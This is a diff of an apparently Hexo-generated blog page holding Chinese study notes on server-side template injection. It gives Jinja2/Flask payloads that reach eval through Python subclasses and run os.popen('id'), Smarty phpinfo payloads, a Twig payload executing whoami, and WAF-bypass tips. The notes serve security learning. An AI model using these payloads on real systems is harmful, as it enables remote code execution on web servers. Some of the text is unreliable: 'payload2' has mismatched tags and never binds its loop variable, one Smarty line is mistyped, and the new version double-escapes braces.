@@ -56,111 +56,81 @@
     </div>
   </header>
   <div class="article-content">
-    
-# SSTI（Server-Side Template Injection，服务器端模板注入）
+    <h1 id="SSTI（Server-Side-Template-Injection，服务器端模板注入）"><a href="#SSTI（Server-Side-Template-Injection，服务器端模板注入）" class="headerlink" title="SSTI（Server-Side Template Injection，服务器端模板注入）"></a>SSTI（Server-Side Template Injection，服务器端模板注入）</h1><p>服务端接受了用户的输入，将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容</p>
+<p>MTV(Model Template View)的开发模式中会经常用到模板(Template)</p>
+<p>模型(Model)用来对数据进行操作,视图(View)用来处理业务逻辑</p>
+<p>模板(Template)负责将页面展示给用户</p>
+<p>核心:前后端分离,方便开发&#x2F;移植</p>
+<h2 id="python模板注入"><a href="#python模板注入" class="headerlink" title="python模板注入"></a>python模板注入</h2><h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><p>源码：</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260321133849757.png" alt="image-20260321133849757"></p>
+<p>payload1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% for c in [] .__class__.__base__.__subclasses__() %&amp;#125;</span><br><span class="line">&amp;#123;% if c .__name _== &#x27;catch_warnings&#x27; %&amp;#125;</span><br><span class="line">&amp;#123;% for b in c .__init__.__globals__. values() %&amp;#125;</span><br><span class="line">&amp;#123;% if b .__class__== &#123;&#125; .__class__%&amp;#125;</span><br><span class="line">&amp;#123;% if &#x27;eval&#x27; in b.keys() %&amp;#125;</span><br><span class="line">&amp;#123;&amp;#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &amp;#125;&amp;#125;</span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br><span class="line">&amp;#123;% endfor %&amp;#125;</span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br><span class="line">&amp;#123;% endfor %&amp;#125;</span><br></pre></td></tr></table></figure>
 
-服务端接受了用户的输入，将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容
+<p>payload2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;&amp;#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&amp;#125;&amp;#125;</span><br><span class="line">&amp;#123;% if c .__name _== &#x27;catch_warnings&#x27; %&amp;#125;</span><br><span class="line">&amp;#123;% for b in c .__init__.__globals__. values() %&amp;#125;</span><br><span class="line">&amp;#123;% if b .__class__== &#123;&#125; .__class__%&amp;#125;</span><br><span class="line">&amp;#123;% if &#x27;eval&#x27; in b.keys() %&amp;#125;</span><br><span class="line">&amp;#123;&amp;#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &amp;#125;&amp;#125;</span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br><span class="line">&amp;#123;% endfor %&amp;#125;</span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br><span class="line">&amp;#123;% endfor %&amp;#125;</span><br></pre></td></tr></table></figure>
 
-MTV(Model Template View)的开发模式中会经常用到模板(Template)
-
-模型(Model)用来对数据进行操作,视图(View)用来处理业务逻辑
-
-模板(Template)负责将页面展示给用户
-
-核心:前后端分离,方便开发/移植
-
-## python模板注入
-
-### Flask
-
-源码：
-
-![image-20260321133849757](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260321133849757.png)
-
-payload1：
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [] .__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c .__name _== &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;% for b in c .__init__.__globals__. values() %&#125;</span><br><span class="line">&#123;% if b .__class__== &#123;&#125; .__class__%&#125;</span><br><span class="line">&#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-payload2：
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br><span class="line">&#123;% if c .__name _== &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;% for b in c .__init__.__globals__. values() %&#125;</span><br><span class="line">&#123;% if b .__class__== &#123;&#125; .__class__%&#125;</span><br><span class="line">&#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-在旧版本的 Python/Jinja2 中， warnings模块中的catch_warnings类\__init__ 方法中保留了全局命名空间（globals） 的引用。这是一个“后门”。
-
-全局变量里通常有一个 `__builtins__` 字典，里面包含了所有内置函数（如 eval, exec, import 等）。
-
-常见可以利用的类：
-
-| 类名             | 判断条件                         | 利用方式              | 适用版本 |
-| :--------------- | :------------------------------- | :-------------------- | :------- |
-| `catch_warnings` | `c.__name__ == 'catch_warnings'` | `__globals__['eval']` | 2.7-3.7  |
-| `_wrap_close`    | `c.__name__ == '_wrap_close'`    | `__globals__['eval']` | 3.5-3.9  |
-| `Popen`          | `c.__name__ == 'Popen'`          | 直接执行命令          | 全版本   |
-| `warning`        | `c.__name__ == 'warning'`        | `__globals__`         | 备选     |
-| `ModuleSpec`     | `c.__name__ == 'ModuleSpec'`     | 复杂利用              | 备选     |
-
-当字符被过滤时，可以使用十六进制编码进行绕过
-
-## PHP模板注入
-
-### payload(针对smarty3)
-
-1.查看版本
-
-{$smarty.version}
-
-2.运行php代码
-
-{phpinfo()}
-
-{if phpinfo()}{/if}
-
-### payload(针对smartyBC)
-
-1.查看版本
-
-{$smarty.version}
-
-2.运行php代码
-
-{phpinfo()}
-
-{if phpinfo()X/if}
-
-### Twig
-
-1.RCE
-
-{{\_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
-
-## WAF绕过
-
-### 绕过单双引号
-
-1.利用chr()
-
-2.利用request
-
-### 绕过方括号
-
-使用\__getitem__()或pop()
-
-### 绕过关键字(\__class__,\__base__等)
-
-1.base64编码绕过(仅适用于python22)
-
-2.字符串拼接绕过
-
-### 绕过下划线
-
-使用request
-
-
-
-
-
-
-
+<p>在旧版本的 Python&#x2F;Jinja2 中， warnings模块中的catch_warnings类_<em>init</em>_ 方法中保留了全局命名空间（globals） 的引用。这是一个“后门”。</p>
+<p>全局变量里通常有一个 <code>__builtins__</code> 字典，里面包含了所有内置函数（如 eval, exec, import 等）。</p>
+<p>常见可以利用的类：</p>
+<table>
+<thead>
+<tr>
+<th align="left">类名</th>
+<th align="left">判断条件</th>
+<th align="left">利用方式</th>
+<th align="left">适用版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>catch_warnings</code></td>
+<td align="left"><code>c.__name__ == &#39;catch_warnings&#39;</code></td>
+<td align="left"><code>__globals__[&#39;eval&#39;]</code></td>
+<td align="left">2.7-3.7</td>
+</tr>
+<tr>
+<td align="left"><code>_wrap_close</code></td>
+<td align="left"><code>c.__name__ == &#39;_wrap_close&#39;</code></td>
+<td align="left"><code>__globals__[&#39;eval&#39;]</code></td>
+<td align="left">3.5-3.9</td>
+</tr>
+<tr>
+<td align="left"><code>Popen</code></td>
+<td align="left"><code>c.__name__ == &#39;Popen&#39;</code></td>
+<td align="left">直接执行命令</td>
+<td align="left">全版本</td>
+</tr>
+<tr>
+<td align="left"><code>warning</code></td>
+<td align="left"><code>c.__name__ == &#39;warning&#39;</code></td>
+<td align="left"><code>__globals__</code></td>
+<td align="left">备选</td>
+</tr>
+<tr>
+<td align="left"><code>ModuleSpec</code></td>
+<td align="left"><code>c.__name__ == &#39;ModuleSpec&#39;</code></td>
+<td align="left">复杂利用</td>
+<td align="left">备选</td>
+</tr>
+</tbody></table>
+<p>当字符被过滤时，可以使用十六进制编码进行绕过</p>
+<h2 id="PHP模板注入"><a href="#PHP模板注入" class="headerlink" title="PHP模板注入"></a>PHP模板注入</h2><h3 id="payload-针对smarty3"><a href="#payload-针对smarty3" class="headerlink" title="payload(针对smarty3)"></a>payload(针对smarty3)</h3><p>1.查看版本</p>
+<p>{$smarty.version}</p>
+<p>2.运行php代码</p>
+<p>{phpinfo()}</p>
+<p>{if phpinfo()}{&#x2F;if}</p>
+<h3 id="payload-针对smartyBC"><a href="#payload-针对smartyBC" class="headerlink" title="payload(针对smartyBC)"></a>payload(针对smartyBC)</h3><p>1.查看版本</p>
+<p>{$smarty.version}</p>
+<p>2.运行php代码</p>
+<p>{phpinfo()}</p>
+<p>{if phpinfo()X&#x2F;if}</p>
+<h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>1.RCE</p>
+<p>&#123;&#123;_self.env.registerUndefinedFilterCallback(“exec”)&#125;&#125;&#123;&#123;_self.env.getFilter(“whoami”)&#125;&#125;</p>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="绕过单双引号"><a href="#绕过单双引号" class="headerlink" title="绕过单双引号"></a>绕过单双引号</h3><p>1.利用chr()</p>
+<p>2.利用request</p>
+<h3 id="绕过方括号"><a href="#绕过方括号" class="headerlink" title="绕过方括号"></a>绕过方括号</h3><p>使用_<em>getitem</em>_()或pop()</p>
+<h3 id="绕过关键字-class-base-等"><a href="#绕过关键字-class-base-等" class="headerlink" title="绕过关键字(_class_,__base__等)"></a>绕过关键字(_<em>class</em>_,__base__等)</h3><p>1.base64编码绕过(仅适用于python22)</p>
+<p>2.字符串拼接绕过</p>
+<h3 id="绕过下划线"><a href="#绕过下划线" class="headerlink" title="绕过下划线"></a>绕过下划线</h3><p>使用request</p>
 
   </div>
 </article>
